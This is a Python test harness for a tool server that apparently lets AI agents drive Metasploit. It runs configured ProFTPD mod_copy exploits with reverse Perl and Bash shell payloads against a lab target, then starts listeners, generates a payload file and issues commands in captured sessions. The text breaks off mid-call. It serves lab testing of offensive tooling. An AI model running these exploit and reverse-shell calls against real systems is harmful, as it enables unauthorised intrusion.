#!/usr/bin/env python3
"""
Comprehensive MetasploitMCP Tool Testing Script

This script tests ALL MetasploitMCP tools using real examples against a vulnerable target
(like Metasploitable 3). It tests both RPC job mode and console mode for exploit execution.

Usage:
    poetry run python scripts/comprehensive_tool_test.py --target 10.0.2.15 --lhost 10.0.2.4

Requirements:
    - MetasploitMCP server running (default: http://127.0.0.1:5555)
    - Metasploit RPC running (msfrpcd)
    - Vulnerable target accessible (e.g., Metasploitable 3)

Tools Tested:
    1. health_check - Check Metasploit RPC connectivity
    2. list_exploits - List available exploits
    3. list_payloads - List payloads (with exploit_module compatibility)
    4. describe_module - Get module information
    5. get_module_documentation - Get module docs
    6. run_exploit (RPC job mode) - Execute exploit as background job
    7. run_exploit (Console mode) - Execute exploit via console
    8. list_active_sessions - List sessions
    9. send_session_command - Execute commands in sessions
    10. list_listeners - List active handlers
    11. start_listener - Start standalone listener
    12. stop_job - Stop background jobs
    13. kill_all_handler_jobs - Kill all handlers
    14. terminate_session - Terminate sessions
    15. generate_payload - Generate payload file
    16. run_auxiliary_module - Run auxiliary modules
    17. run_post_module - Run post modules (requires session)
"""

import argparse
import asyncio
import json
import logging
import sys
import traceback
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from langchain_mcp_adapters.client import MultiServerMCPClient

# --- Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("comprehensive_tool_test")


class TestStatus(Enum):
    PASSED = "PASSED"
    FAILED = "FAILED"
    SKIPPED = "SKIPPED"
    WARNING = "WARNING"


@dataclass
class TestResult:
    """Result of a single tool test."""
    tool_name: str
    test_name: str
    status: TestStatus
    message: str = ""
    duration_seconds: float = 0.0
    details: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None


class MetasploitMCPTestClient:
    """MCP client for testing MetasploitMCP tools."""
    
    def __init__(self, mcp_url: str = "http://127.0.0.1:5555/mcp", use_gateway: bool = False):
        """Initialize MCP test client."""
        self.mcp_url = mcp_url.rstrip('/')
        self.use_gateway = use_gateway
        self.tool_prefix = "metasploit_" if use_gateway else ""
        
        tools_config = {
            "metasploit": {
                "url": self.mcp_url,
                "transport": "streamable_http"
            }
        }
        
        self.client = MultiServerMCPClient(tools_config)
        self._tools = None
        
        server_type = "ExploitMCP Gateway" if use_gateway else "MetasploitMCP Server"
        logger.info(f"Initialized test client for {server_type}: {self.mcp_url}")
    
    async def close(self):
        """Close the MCP client."""
        pass
    
    async def _ensure_tools_loaded(self):
        """Ensure tools are loaded from MCP server."""
        if self._tools is None:
            logger.debug("Loading tools from MCP server...")
            self._tools = await self.client.get_tools()
            logger.info(f"Loaded {len(self._tools)} tools from MCP server")
    
    async def get_available_tools(self) -> List[str]:
        """Get list of available tool names."""
        await self._ensure_tools_loaded()
        return [t.name for t in self._tools]
    
    async def call_tool(self, tool_name: str, arguments: Dict[str, Any] = None) -> Dict[str, Any]:
        """Call an MCP tool."""
        actual_tool_name = f"{self.tool_prefix}{tool_name}"
        arguments = arguments or {}
        
        logger.info(f"Calling tool: {actual_tool_name} with args: {arguments}")
        
        await self._ensure_tools_loaded()
        
        tool = None
        for t in self._tools:
            if t.name == actual_tool_name:
                tool = t
                break
        
        if not tool:
            available = [t.name for t in self._tools]
            raise Exception(f"Tool '{actual_tool_name}' not found. Available: {available[:10]}...")
        
        result = await tool.ainvoke(arguments)
        logger.info(f"Tool response: {str(result)}")
        
        return {"success": True, "data": result}


class ComprehensiveToolTester:
    """Comprehensive tester for all MetasploitMCP tools."""
    
    def __init__(
        self,
        target_ip: str,
        lhost: str,
        lport: int = 4444,
        mcp_url: str = "http://127.0.0.5555/mcp",
        use_gateway: bool = False
    ):
        """Initialize comprehensive tester."""
        self.target_ip = target_ip
        self.lhost = lhost
        self.lport = lport
        self.mcp_client = MetasploitMCPTestClient(mcp_url, use_gateway)
        self.results: List[TestResult] = []
        self.current_session_id: Optional[int] = None
        
        logger.info(f"Comprehensive Tool Tester initialized:")
        logger.info(f"  Target: {target_ip}")
        logger.info(f"  LHOST: {lhost}")
        logger.info(f"  LPORT: {lport}")
        logger.info(f"  MCP URL: {mcp_url}")
    
    def _parse_result(self, result: Any) -> Dict[str, Any]:
        """Parse tool result into a dictionary."""
        if isinstance(result, dict):
            if "data" in result:
                data = result["data"]
                if isinstance(data, str):
                    try:
                        return json.loads(data)
                    except json.JSONDecodeError:
                        return {"raw": data}
                return data if isinstance(data, dict) else {"raw": data}
            return result
        if isinstance(result, str):
            try:
                return json.loads(result)
            except json.JSONDecodeError:
                return {"raw": result}
        return {"raw": str(result)}
    
    async def _run_test(
        self,
        tool_name: str,
        test_name: str,
        tool_args: Dict[str, Any] = None,
        expected_status: str = "success",
        validate_fn: callable = None
    ) -> TestResult:
        """Run a single tool test."""
        start_time = datetime.now()
        
        try:
            logger.info(f"\n{'='*60}")
            logger.info(f"Testing: {tool_name} - {test_name}")
            logger.info(f"{'='*60}")
            
            result = await self.mcp_client.call_tool(tool_name, tool_args)
            parsed = self._parse_result(result)
            
            duration = (datetime.now() - start_time).total_seconds()
            
            # Check status if applicable
            status = TestStatus.PASSED
            message = "Tool executed successfully"
            
            if isinstance(parsed, dict):
                actual_status = parsed.get("status", "unknown")
                if expected_status and actual_status != expected_status:
                    # Check for acceptable alternatives
                    if actual_status in ["warning", "success"] and expected_status == "success":
                        status = TestStatus.WARNING
                        message = f"Tool returned '{actual_status}' instead of '{expected_status}'"
                    elif actual_status == "aborted" and expected_status == "success":
                        # Aborted is acceptable for check operations
                        status = TestStatus.WARNING
                        message = f"Check aborted (target may not be vulnerable): {parsed.get('message', '')}"
                    else:
                        status = TestStatus.FAILED
                        message = f"Expected status '{expected_status}', got '{actual_status}': {parsed.get('message', '')}"
            
            # Run custom validation if provided
            if validate_fn and status != TestStatus.FAILED:
                try:
                    is_valid, validation_msg = validate_fn(parsed)
                    if not is_valid:
                        status = TestStatus.FAILED
                        message = validation_msg
                except Exception as ve:
                    status = TestStatus.WARNING
                    message = f"Validation error: {ve}"
            
            logger.info(f"✓ {tool_name}: {status.value} - {message}")
            
            return TestResult(
                tool_name=tool_name,
                test_name=test_name,
                status=status,
                message=message,
                duration_seconds=duration,
                details=parsed
            )
            
        except Exception as e:
            duration = (datetime.now() - start_time).total_seconds()
            error_msg = f"{str(e)}\n{traceback.format_exc()}"
            logger.error(f"✗ {tool_name}: FAILED - {str(e)}")
            
            return TestResult(
                tool_name=tool_name,
                test_name=test_name,
                status=TestStatus.FAILED,
                message=str(e),
                duration_seconds=duration,
                error=error_msg
            )
    
    # ==========================================================================
    # Test Methods for Each Tool
    # ==========================================================================
    
    async def test_health_check(self) -> TestResult:
        """Test 1: health_check tool."""
        def validate(result):
            if "msf_version" in result:
                return True, "MSF version found"
            return False, "MSF version not in response"
        
        return await self._run_test(
            tool_name="health_check",
            test_name="Check Metasploit RPC connectivity",
            tool_args={},
            expected_status="ok",
            validate_fn=validate
        )
    
    async def test_list_exploits_no_filter(self) -> TestResult:
        """Test 2a: list_exploits without filter."""
        def validate(result):
            if isinstance(result, dict) and "raw" in result:
                raw = result["raw"]
                if isinstance(raw, list) and len(raw) > 0:
                    return True, f"Found {len(raw)} exploits"
            if isinstance(result, list) and len(result) > 0:
                return True, f"Found {len(result)} exploits"
            return False, "No exploits returned"
        
        return await self._run_test(
            tool_name="list_exploits",
            test_name="List exploits without filter",
            tool_args={"search_term": ""},
            expected_status=None,  # Returns list directly
            validate_fn=validate
        )
    
    async def test_list_exploits_with_filter(self) -> TestResult:
        """Test 2b: list_exploits with search filter."""
        def validate(result):
            raw = result.get("raw", result) if isinstance(result, dict) else result
            if isinstance(raw, list):
                matching = [e for e in raw if "proftpd" in str(e).lower()]
                if matching:
                    return True, f"Found ProFTPD exploits: {matching}"
            return False, "ProFTPD exploit not found"
        
        return await self._run_test(
            tool_name="list_exploits",
            test_name="List exploits with 'proftpd' filter",
            tool_args={"search_term": "proftpd"},
            expected_status=None,
            validate_fn=validate
        )
    
    async def test_list_payloads_by_platform(self) -> TestResult:
        """Test 3a: list_payloads by platform."""
        def validate(result):
            raw = result.get("raw", result) if isinstance(result, dict) else result
            if isinstance(raw, list) and len(raw) > 0:
                linux_payloads = [p for p in raw if "linux" in str(p).lower()]
                if linux_payloads:
                    return True, f"Found {len(linux_payloads)} linux payloads"
            return False, "No linux payloads returned"
        
        return await self._run_test(
            tool_name="list_payloads",
            test_name="List payloads for linux platform",
            tool_args={"platform": "linux"},
            expected_status=None,
            validate_fn=validate
        )
    
    async def test_list_payloads_for_exploit(self) -> TestResult:
        """Test 3b: list_payloads compatible with exploit module."""
        def validate(result):
            raw = result.get("raw", result) if isinstance(result, dict) else result
            if isinstance(raw, list) and len(raw) > 0:
                return True, f"Found {len(raw)} compatible payloads"
            if isinstance(raw, list) and len(raw) == 1 and "Error" in str(raw[0]):
                return False, str(raw[0])
            return False, "No compatible payloads returned"
        
        return await self._run_test(
            tool_name="list_payloads",
            test_name="List payloads compatible with proftpd_modcopy_exec",
            tool_args={"exploit_module": "unix/ftp/proftpd_modcopy_exec"},
            expected_status=None,
            validate_fn=validate
        )
    
    async def test_list_payloads_proftpd_debug(self) -> TestResult:
        """
        Test 3c: Debug test for proftpd_modcopy_exec payload listing issue.
        
        This test investigates why list_payloads returns 0 payloads when filters are applied.
        Tests multiple filter combinations to identify the root cause.
        """
        start_time = datetime.now()
        exploit_module = "unix/ftp/proftpd_modcopy_exec"
        test_results = []
        
        # Test 1: No filters (baseline - should return payloads)
        logger.info(f"\n{'='*60}")
        logger.info("DEBUG TEST: proftpd_modcopy_exec payload listing")
        logger.info(f"{'='*60}")
        logger.info("Test 1: list_payloads with exploit_module only (no filters)")
        
        try:
            result1 = await self.mcp_client.call_tool("list_payloads", {
                "exploit_module": exploit_module
            })
            parsed1 = self._parse_result(result1)
            raw1 = parsed1.get("raw", parsed1) if isinstance(parsed1, dict) else parsed1
            count1 = len(raw1) if isinstance(raw1, list) else 0
            logger.info(f"  Result: {count1} payloads returned")
            if isinstance(raw1, list) and count1 > 0:
                logger.info(f"  Sample payloads: {raw1[:5]}")
            test_results.append(("No filters", count1, raw1 if isinstance(raw1, list) else []))
        except Exception as e:
            logger.error(f"  Error: {e}")
            test_results.append(("No filters", -1, f"Error: {e}"))
        
        # Test 2: Platform='unix' filter
        logger.info("\nTest 2: list_payloads with exploit_module + platform='unix'")
        try:
            result2 = await self.mcp_client.call_tool("list_payloads", {
                "exploit_module": exploit_module,
                "platform": "unix"
            })
            parsed2 = self._parse_result(result2)
            raw2 = parsed2.get("raw", parsed2) if isinstance(parsed2, dict) else parsed2
            count2 = len(raw2) if isinstance(raw2, list) else 0
            logger.info(f"  Result: {count2} payloads returned")
            if isinstance(raw2, list) and count2 > 0:
                logger.info(f"  Sample payloads: {raw2[:5]}")
            test_results.append(("Platform=unix", count2, raw2 if isinstance(raw2, list) else []))
        except Exception as e:
            logger.error(f"  Error: {e}")
            test_results.append(("Platform=unix", -1, f"Error: {e}"))
        
        # Test 3: Platform='linux' filter
        logger.info("\nTest 3: list_payloads with exploit_module + platform='linux'")
        try:
            result3 = await self.mcp_client.call_tool("list_payloads", {
                "exploit_module": exploit_module,
                "platform": "linux"
            })
            parsed3 = self._parse_result(result3)
            raw3 = parsed3.get("raw", parsed3) if isinstance(parsed3, dict) else parsed3
            count3 = len(raw3) if isinstance(raw3, list) else 0
            logger.info(f"  Result: {count3} payloads returned")
            if isinstance(raw3, list) and count3 > 0:
                logger.info(f"  Sample payloads: {raw3[:5]}")
            test_results.append(("Platform=linux", count3, raw3 if isinstance(raw3, list) else []))
        except Exception as e:
            logger.error(f"  Error: {e}")
            test_results.append(("Platform=linux", -1, f"Error: {e}"))
        
        # Test 4: Platform='unix' + arch='x86'
        logger.info("\nTest 4: list_payloads with exploit_module + platform='unix' + arch='x86'")
        try:
            result4 = await self.mcp_client.call_tool("list_payloads", {
                "exploit_module": exploit_module,
                "platform": "unix",
                "arch": "x86"
            })
            parsed4 = self._parse_result(result4)
            raw4 = parsed4.get("raw", parsed4) if isinstance(parsed4, dict) else parsed4
            count4 = len(raw4) if isinstance(raw4, list) else 0
            logger.info(f"  Result: {count4} payloads returned")
            if isinstance(raw4, list) and count4 > 0:
                logger.info(f"  Sample payloads: {raw4[:5]}")
            test_results.append(("Platform=unix, Arch=x86", count4, raw4 if isinstance(raw4, list) else []))
        except Exception as e:
            logger.error(f"  Error: {e}")
            test_results.append(("Platform=unix, Arch=x86", -1, f"Error: {e}"))
        
        # Test 5: Platform='linux' + arch='x86'
        logger.info("\nTest 5: list_payloads with exploit_module + platform='linux' + arch='x86'")
        try:
            result5 = await self.mcp_client.call_tool("list_payloads", {
                "exploit_module": exploit_module,
                "platform": "linux",
                "arch": "x86"
            })
            parsed5 = self._parse_result(result5)
            raw5 = parsed5.get("raw", parsed5) if isinstance(parsed5, dict) else parsed5
            count5 = len(raw5) if isinstance(raw5, list) else 0
            logger.info(f"  Result: {count5} payloads returned")
            if isinstance(raw5, list) and count5 > 0:
                logger.info(f"  Sample payloads: {raw5[:5]}")
            test_results.append(("Platform=linux, Arch=x86", count5, raw5 if isinstance(raw5, list) else []))
        except Exception as e:
            logger.error(f"  Error: {e}")
            test_results.append(("Platform=linux, Arch=x86", -1, f"Error: {e}"))
        
        # Test 6: Arch='x86' only (no platform filter)
        logger.info("\nTest 6: list_payloads with exploit_module + arch='x86' (no platform)")
        try:
            result6 = await self.mcp_client.call_tool("list_payloads", {
                "exploit_module": exploit_module,
                "arch": "x86"
            })
            parsed6 = self._parse_result(result6)
            raw6 = parsed6.get("raw", parsed6) if isinstance(parsed6, dict) else parsed6
            count6 = len(raw6) if isinstance(raw6, list) else 0
            logger.info(f"  Result: {count6} payloads returned")
            if isinstance(raw6, list) and count6 > 0:
                logger.info(f"  Sample payloads: {raw6[:5]}")
            test_results.append(("Arch=x86 only", count6, raw6 if isinstance(raw6, list) else []))
        except Exception as e:
            logger.error(f"  Error: {e}")
            test_results.append(("Arch=x86 only", -1, f"Error: {e}"))
        
        # Summary
        logger.info(f"\n{'='*60}")
        logger.info("DEBUG TEST SUMMARY")
        logger.info(f"{'='*60}")
        for test_name, count, payloads in test_results:
            if isinstance(payloads, list) and count > 0:
                logger.info(f"  {test_name}: {count} payloads")
                # Show first few payload names to understand format
                sample = [str(p)[:80] for p in payloads[:3]]
                for p in sample:
                    logger.info(f"    - {p}")
            elif count == 0:
                logger.warning(f"  {test_name}: 0 payloads (THIS IS THE PROBLEM)")
            else:
                logger.error(f"  {test_name}: {payloads}")
        
        # Determine test status
        baseline_count = test_results[0][1] if test_results else 0
        if baseline_count > 0:
            # Check if filters are causing the issue
            filtered_counts = [count for _, count, _ in test_results[1:] if count >= 0]
            if all(c == 0 for c in filtered_counts):
                status = TestStatus.FAILED
                message = f"Filters are filtering out all {baseline_count} payloads. Baseline (no filters) returns {baseline_count} payloads, but all filtered queries return 0."
            elif any(c == 0 for c in filtered_counts):
                status = TestStatus.WARNING
                message = f"Some filter combinations return 0 payloads. Baseline: {baseline_count}, Filtered: {filtered_counts}"
            else:
                status = TestStatus.PASSED
                message = f"All filter combinations return payloads. Baseline: {baseline_count}, Filtered: {filtered_counts}"
        else:
            status = TestStatus.FAILED
            message = f"Baseline query (no filters) returned {baseline_count} payloads. Exploit may not have compatible payloads or there's an issue with module.payloads call."
        
        duration = (datetime.now() - start_time).total_seconds()
        
        return TestResult(
            tool_name="list_payloads",
            test_name="Debug proftpd_modcopy_exec payload listing",
            status=status,
            message=message,
            duration_seconds=duration,
            details={
                "test_results": test_results,
                "baseline_count": baseline_count
            }
        )
    
    async def test_describe_module_exploit(self) -> TestResult:
        """Test 4a: describe_module for exploit."""
        def validate(result):
            if result.get("status") == "success":
                if "options" in result and "description" in result:
                    return True, f"Module '{result.get('name', 'unknown')}' described"
            return False, f"Module description incomplete: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="describe_module",
            test_name="Describe ProFTPD exploit module",
            tool_args={
                "module_name": "unix/ftp/proftpd_modcopy_exec",
                "module_type": "exploit"
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_describe_module_payload(self) -> TestResult:
        """Test 4b: describe_module for payload."""
        def validate(result):
            if result.get("status") == "success":
                if "options" in result:
                    return True, f"Payload described with {len(result.get('options', {}))} options"
            return False, f"Payload description incomplete: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="describe_module",
            test_name="Describe reverse_perl payload",
            tool_args={
                "module_name": "cmd/unix/reverse_perl",
                "module_type": "payload"
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_describe_module_auxiliary(self) -> TestResult:
        """Test 4c: describe_module for auxiliary."""
        def validate(result):
            if result.get("status") == "success":
                return True, f"Auxiliary module described"
            return False, f"Auxiliary description failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="describe_module",
            test_name="Describe FTP version scanner",
            tool_args={
                "module_name": "scanner/ftp/ftp_version",
                "module_type": "auxiliary"
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_get_module_documentation(self) -> TestResult:
        """Test 5: get_module_documentation."""
        # Documentation may not exist for all modules, so we accept not_found and not_available
        def validate(result):
            status = result.get("status")
            if status in ["success", "not_found", "not_available"]:
                return True, f"Documentation query returned: {status}"
            return False, f"Unexpected status: {status}"
        
        return await self._run_test(
            tool_name="get_module_documentation",
            test_name="Get module documentation",
            tool_args={"module_name": "exploit/unix/ftp/proftpd_modcopy_exec"},
            expected_status=None,  # Accept any valid response
            validate_fn=validate
        )
    
    async def test_run_auxiliary_module(self) -> TestResult:
        """Test 6: run_auxiliary_module (FTP version scan)."""
        def validate(result):
            if result.get("status") in ["success", "warning"]:
                return True, "Auxiliary module executed"
            return False, f"Auxiliary failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="run_auxiliary_module",
            test_name="Run FTP version scanner",
            tool_args={
                "module_name": "scanner/ftp/ftp_version",
                "options": {"RHOSTS": self.target_ip, "RPORT": 21},
                "run_as_job": False,
                "timeout_seconds": 60
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_run_auxiliary_module_invalid_module(self) -> TestResult:
        """Test 6b: run_auxiliary_module with invalid module name (module validation)."""
        def validate(result):
            # Should return error status immediately without waiting for timeout
            if result.get("status") == "error":
                msg = result.get("message", "")
                if "not found" in msg.lower() or "invalid" in msg.lower():
                    return True, "Module validation caught invalid module name"
            return False, f"Expected error for invalid module, got: {result.get('status')} - {result.get('message', '')}"
        
        return await self._run_test(
            tool_name="run_auxiliary_module",
            test_name="Run auxiliary with invalid module (validation test)",
            tool_args={
                "module_name": "scanner/http/nonexistent_module_12345",
                "options": {"RHOSTS": self.target_ip, "RPORT": 80},
                "run_as_job": False,
                "timeout_seconds": 60
            },
            expected_status="error",
            validate_fn=validate
        )
    
    async def test_run_auxiliary_module_failed_to_load(self) -> TestResult:
        """Test 6c: run_auxiliary_module with module that fails to load (early exit detection)."""
        def validate(result):
            # Should detect "Failed to load module" early and return error
            # This test uses a module that might exist but fails to load
            if result.get("status") == "error":
                msg = result.get("message", "").lower()
                output = result.get("module_output", "").lower()
                if "failed to load" in msg or "failed to load" in output:
                    return True, "Early exit detected 'Failed to load module' error"
                # Also accept "not found" as valid validation
                if "not found" in msg:
                    return True, "Module validation caught non-existent module"
            return False, f"Expected error for failed module load, got: {result.get('status')} - {result.get('message', '')}"
        
        # Use a module that might not exist or fail to load
        return await self._run_test(
            tool_name="run_auxiliary_module",
            test_name="Run auxiliary with module that fails to load (early exit test)",
            tool_args={
                "module_name": "scanner/http/show_robots",  # This module may not exist in all MSF versions
                "options": {"RHOSTS": self.target_ip, "RPORT": 80},
                "run_as_job": False,
                "timeout_seconds": 60
            },
            expected_status="error",
            validate_fn=validate
        )
    
    async def test_run_exploit_invalid_module(self) -> TestResult:
        """Test: run_exploit with invalid module name (module validation)."""
        def validate(result):
            # Should return error status immediately without waiting for timeout
            if result.get("status") == "error":
                msg = result.get("message", "")
                if "not found" in msg.lower() or "invalid" in msg.lower():
                    return True, "Module validation caught invalid module name"
            return False, f"Expected error for invalid module, got: {result.get('status')} - {result.get('message', '')}"
        
        return await self._run_test(
            tool_name="run_exploit",
            test_name="Run exploit with invalid module (validation test)",
            tool_args={
                "module_name": "exploit/multi/http/nonexistent_exploit_12345",
                "options": {"RHOSTS": self.target_ip},
                "payload_name": "linux/x86/meterpreter/reverse_tcp",
                "payload_options": {"LHOST": self.lhost, "LPORT": 4444},
                "run_as_job": False,
                "timeout_seconds": 60
            },
            expected_status="error",
            validate_fn=validate
        )
    
    async def test_run_exploit_failed_to_load(self) -> TestResult:
        """Test: run_exploit with module that fails to load (early exit detection)."""
        def validate(result):
            # Should detect "Failed to load module" early and return error
            if result.get("status") == "error":
                msg = result.get("message", "").lower()
                output = result.get("module_output", "").lower()
                check_output = result.get("check_output", "").lower()
                if "failed to load" in msg or "failed to load" in output or "failed to load" in check_output:
                    return True, "Early exit detected 'Failed to load module' error"
                # Also accept "not found" as valid validation
                if "not found" in msg:
                    return True, "Module validation caught non-existent module"
            return False, f"Expected error for failed module load, got: {result.get('status')} - {result.get('message', '')}"
        
        # Use a module that might not exist or fail to load
        return await self._run_test(
            tool_name="run_exploit",
            test_name="Run exploit with module that fails to load (early exit test)",
            tool_args={
                "module_name": "multi/http/cups_ipp_remote_code_execution",  # This module may not exist in all MSF versions
                "options": {"RHOSTS": self.target_ip, "RPORT": 631},
                "payload_name": "cmd/unix/reverse_bash",
                "payload_options": {"LHOST": self.lhost, "LPORT": 4444},
                "run_as_job": False,
                "check_vulnerability": True,
                "timeout_seconds": 60
            },
            expected_status="error",
            validate_fn=validate
        )
    
    async def test_list_listeners_initial(self) -> TestResult:
        """Test 7: list_listeners (initial state)."""
        def validate(result):
            if result.get("status") == "success":
                return True, f"Handlers: {result.get('handler_count', 0)}, Other: {result.get('other_job_count', 0)}"
            return False, f"List listeners failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="list_listeners",
            test_name="List active listeners (initial)",
            tool_args={},
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_start_listener(self) -> TestResult:
        """Test 8: start_listener."""
        def validate(result):
            if result.get("status") == "success":
                if "job_id" in result or "job" in str(result.get("message", "")).lower():
                    return True, f"Listener started: {result.get('message', '')}"
            return False, f"Start listener failed: {result.get('message', 'unknown')}"
        
        # Use a different port to avoid conflicts with exploit tests
        listener_port = self.lport + 1
        
        return await self._run_test(
            tool_name="start_listener",
            test_name=f"Start standalone listener on port {listener_port}",
            tool_args={
                "payload_type": "cmd/unix/reverse_perl",
                "lhost": self.lhost,
                "lport": listener_port,
                "exit_on_session": True
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_stop_job(self) -> TestResult:
        """Test 9: stop_job (stop the listener we just created)."""
        # First get the job ID from list_listeners
        try:
            listeners_result = await self.mcp_client.call_tool("list_listeners", {})
            parsed = self._parse_result(listeners_result)
            
            handlers = parsed.get("handlers", {})
            if not handlers:
                return TestResult(
                    tool_name="stop_job",
                    test_name="Stop a job",
                    status=TestStatus.SKIPPED,
                    message="No handlers found to stop"
                )
            
            # Get first handler job ID
            job_id = int(list(handlers.keys())[0])
            
            def validate(result):
                if result.get("status") == "success":
                    return True, f"Job {job_id} stopped"
                return False, f"Stop job failed: {result.get('message', 'unknown')}"
            
            return await self._run_test(
                tool_name="stop_job",
                test_name=f"Stop job {job_id}",
                tool_args={"job_id": job_id},
                expected_status="success",
                validate_fn=validate
            )
        except Exception as e:
            return TestResult(
                tool_name="stop_job",
                test_name="Stop a job",
                status=TestStatus.FAILED,
                message=str(e),
                error=traceback.format_exc()
            )
    
    async def test_generate_payload(self) -> TestResult:
        """Test 10: generate_payload."""
        def validate(result):
            if result.get("status") == "success":
                if "server_save_path" in result:
                    return True, f"Payload saved to: {result.get('server_save_path')}"
            return False, f"Generate payload failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="generate_payload",
            test_name="Generate reverse perl payload",
            tool_args={
                "payload_type": "cmd/unix/reverse_perl",
                "format_type": "raw",
                "options": {"LHOST": self.lhost, "LPORT": self.lport + 2000}
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_kill_all_handler_jobs(self) -> TestResult:
        """Test 11: kill_all_handler_jobs (cleanup before exploit tests)."""
        def validate(result):
            if result.get("status") in ["success", "warning"]:
                return True, f"Handlers killed: {result.get('handlers_killed', 0)}"
            return False, f"Kill handlers failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="kill_all_handler_jobs",
            test_name="Kill all handler jobs (cleanup)",
            tool_args={},
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_run_exploit_rpc_job_mode(self) -> TestResult:
        """Test 12: run_exploit in RPC job mode."""
        def validate(result):
            status = result.get("status")
            if status == "success":
                # Check for session or job ID
                has_session = "session" in str(result).lower()
                has_job = "job_id" in result
                if has_session or has_job:
                    return True, f"Exploit executed (job_id: {result.get('job_id', 'N/A')})"
            elif status in ["warning", "aborted"]:
                return True, f"Exploit result: {result.get('message', '')}"
            return False, f"Exploit failed: {result.get('message', 'unknown')}"
        
        # ProFTPD ModCopy exploit in RPC job mode
        return await self._run_test(
            tool_name="run_exploit",
            test_name="Run ProFTPD exploit (RPC job mode)",
            tool_args={
                "module_name": "unix/ftp/proftpd_modcopy_exec",
                "options": {
                    "RHOSTS": self.target_ip,
                    "RPORT": 80,
                    "RPORT_FTP": 21,
                    "SITEPATH": "/var/www/html/",
                    "TARGETURI": "/",
                    "TMPPATH": "/tmp"
                },
                "payload_name": "cmd/unix/reverse_perl",
                "payload_options": {
                    "LHOST": self.lhost,
                    "LPORT": self.lport
                },
                "run_as_job": True,
                "check_vulnerability": False
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_check_exploit_rpc_job_mode(self) -> TestResult:
        """Test 12: check_exploit in RPC job mode."""
        def validate(result):
            status = result.get("status")
            if status == "success":
                print(result)
                return True, f"Exploit checked: {result.get('message', '')}"
            elif status in ["warning", "aborted"]:
                return True, f"Exploit result: {result.get('message', '')}"
            return False, f"Exploit failed: {result.get('message', 'unknown')}"
        
        # ProFTPD ModCopy exploit in RPC job mode
        return await self._run_test(
            tool_name="run_exploit",
            test_name="Check ProFTPD exploit (RPC job mode)",
            tool_args={
                "module_name": "unix/ftp/proftpd_modcopy_exec",
                "options": {
                    "RHOSTS": self.target_ip,
                    "RPORT": 80,
                    "RPORT_FTP": 21,
                    "SITEPATH": "/var/www/html/",
                    "TARGETURI": "/",
                    "TMPPATH": "/tmp"
                },
                "run_as_job": True,
                "check_vulnerability": True
            },
            expected_status="success",
            validate_fn=validate
        )

    async def test_list_active_sessions_after_exploit(self) -> TestResult:
        """Test 13: list_active_sessions after exploit."""
        # Wait a moment for session to establish
        await asyncio.sleep(3)
        
        def validate(result):
            if result.get("status") == "success":
                sessions = result.get("sessions", {})
                count = result.get("count", len(sessions))
                if count > 0:
                    # Store session ID for later tests
                    session_ids = list(sessions.keys())
                    logger.info(f"Active sessions: {session_ids}")
                    return True, f"Found {count} active session(s)"
                return True, "No active sessions (exploit may not have succeeded)"
            return False, f"List sessions failed: {result.get('message', 'unknown')}"
        
        result = await self._run_test(
            tool_name="list_active_sessions",
            test_name="List sessions after RPC exploit",
            tool_args={},
            expected_status="success",
            validate_fn=validate
        )
        
        # Try to extract session ID for later tests
        if result.status == TestStatus.PASSED:
            sessions = result.details.get("sessions", {})
            if sessions:
                self.current_session_id = int(list(sessions.keys())[0])
                logger.info(f"Stored session ID for later tests: {self.current_session_id}")
        
        return result
    
    async def test_send_session_command(self) -> TestResult:
        """Test 14: send_session_command."""
        if self.current_session_id is None:
            return TestResult(
                tool_name="send_session_command",
                test_name="Send command to session",
                status=TestStatus.SKIPPED,
                message="No active session available for testing"
            )
        
        def validate(result):
            if result.get("status") == "success":
                output = result.get("output", result.get("raw_output", ""))
                if output:
                    return True, f"Command output received ({len(output)} chars)"
                return True, "Command executed (no output)"
            return False, f"Command failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="send_session_command",
            test_name=f"Send 'id' command to session {self.current_session_id}",
            tool_args={
                "session_id": self.current_session_id,
                "command": "id",
                "timeout_seconds": 30
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_terminate_session(self) -> TestResult:
        """Test 15: terminate_session."""
        if self.current_session_id is None:
            return TestResult(
                tool_name="terminate_session",
                test_name="Terminate session",
                status=TestStatus.SKIPPED,
                message="No active session to terminate"
            )
        
        def validate(result):
            if result.get("status") in ["success", "warning"]:
                return True, f"Session terminated: {result.get('message', '')}"
            return False, f"Terminate failed: {result.get('message', 'unknown')}"
        
        result = await self._run_test(
            tool_name="terminate_session",
            test_name=f"Terminate session {self.current_session_id}",
            tool_args={
                "session_id": self.current_session_id,
                "kill_associated_job": True
            },
            expected_status="success",
            validate_fn=validate
        )
        
        if result.status in [TestStatus.PASSED, TestStatus.WARNING]:
            self.current_session_id = None
        
        return result
    
    async def test_run_exploit_console_mode(self) -> TestResult:
        """Test 16: run_exploit in console mode."""
        # Clean up first
        await self.mcp_client.call_tool("kill_all_handler_jobs", {})
        await asyncio.sleep(2)
        
        def validate(result):
            status = result.get("status")
            if status == "success":
                return True, "Exploit executed via console"
            elif status in ["warning", "aborted"]:
                return True, f"Exploit result: {result.get('message', '')}"
            return False, f"Exploit failed: {result.get('message', 'unknown')}"
        
        # ProFTPD ModCopy exploit in console mode
        return await self._run_test(
            tool_name="run_exploit",
            test_name="Run ProFTPD exploit (Console mode)",
            tool_args={
